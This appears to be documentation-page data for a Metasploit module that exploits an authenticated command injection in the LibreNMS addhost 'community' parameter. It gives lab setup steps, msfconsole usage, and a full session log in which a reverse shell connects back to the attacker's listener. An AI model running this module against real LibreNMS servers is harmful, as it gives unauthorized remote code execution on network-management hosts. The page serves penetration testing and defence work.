{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/librenms_addhost_cmd_inject","result":{"data":{"moduleMetadataJson":{"id":"206b17a7-2571-542d-872a-6719a106e0f1","name":"LibreNMS addhost Command Injection","fullname":"exploit/linux/http/librenms_addhost_cmd_inject","description":"This module exploits a command injection vulnerability in the open source\n         network management software known as LibreNMS. The community parameter used\n         in a POST request to the addhost functionality is unsanitized. This parameter\n         is later used as part of a shell command that gets passed to the popen function\n         in capture.inc.php, which can result in execution of arbitrary code.\n\n         This module requires authentication to LibreNMS first.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/librenms_addhost_cmd_inject","documentationSlug":"/modules/documentation/exploit/linux/http/librenms_addhost_cmd_inject"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  In LibreNMS <code class=\"language-text\">v1.46</code> and below, there exists a command injection vulnerability in <code class=\"language-text\">capture.inc.php</code>.\nThe vulnerable functionality is intended to run a command such as <code class=\"language-text\">snmpwalk</code> and save the output as\na file. The <code class=\"language-text\">community</code> parameter is an unsanitized parameter retrieved through a POST request to <code class=\"language-text\">addhost</code>,\nand it is used to build the command that is executed in the <code class=\"language-text\">capture.inc.php</code> functionality. The final command\nis passed to the <code class=\"language-text\">popen()</code> function, which results in execution of arbitrary code.</p>\n<p>  This module has been tested on LibreNMS <code class=\"language-text\">v1.46</code> and <code class=\"language-text\">v1.45</code>.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  A <a href=\"https://github.com/librenms/packer-builds/releases/tag/1.46\">pre-built OVA</a> can be downloaded via a LibreNMS repo.</p>\n<p>  Additionally, vulnerable versions of LibreNMS for Ubuntu can be manually installed using the instructions <a href=\"https://docs.librenms.org/Installation/Installation-Ubuntu-1804-Apache/\">here</a>.\nIn the command <code class=\"language-text\">composer create-project --no-dev --keep-vcs librenms/librenms librenms dev-master</code>, replace <code class=\"language-text\">dev-master</code> with a vulnerable version of the software, ex: <code class=\"language-text\">1.46</code>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/librenms_addhost_cmd_inject</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME &lt;user&gt;</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD &lt;pass&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"tested-on-librenms-146-on-ubuntu-1804\" style=\"position:relative;\"><a href=\"#tested-on-librenms-146-on-ubuntu-1804\" aria-label=\"tested on librenms 146 on ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on LibreNMS 1.46 on Ubuntu 18.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/librenms_addhost_cmd_inject\nmsf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set rhosts 192.168.37.143\nrhosts =&gt; 192.168.37.143\nmsf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set username blah\nusername =&gt; blah\nmsf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set password password\npassword =&gt; password\nmsf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set lhost 192.168.37.1\nlhost =&gt; 192.168.37.1\nmsf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; run\n\n[*] Started reverse TCP double handler on 192.168.37.1:4444 \n[*] Successfully logged into LibreNMS\n[+] Successfully added device with hostname dFEzcH\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[+] Successfully deleted device with hostname dFEzcH and id #126\n[*] Command: echo 38eJIFZsiRl3Er48;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;Trying: not found\\r\\nsh: 2: Connected: not found\\r\\nsh: 3: Escape: not found\\r\\n38eJIFZsiRl3Er48\\r\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (192.168.37.1:4444 -&gt; 192.168.37.143:55380) at 2019-05-29 15:26:02 -0500\n\nwhoami\nwww-data\nuname -a\nLinux ubuntu 4.18.0-15-generic #16~18.04.1-Ubuntu SMP Thu Feb 7 14:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"206b17a7-2571-542d-872a-6719a106e0f1"}}}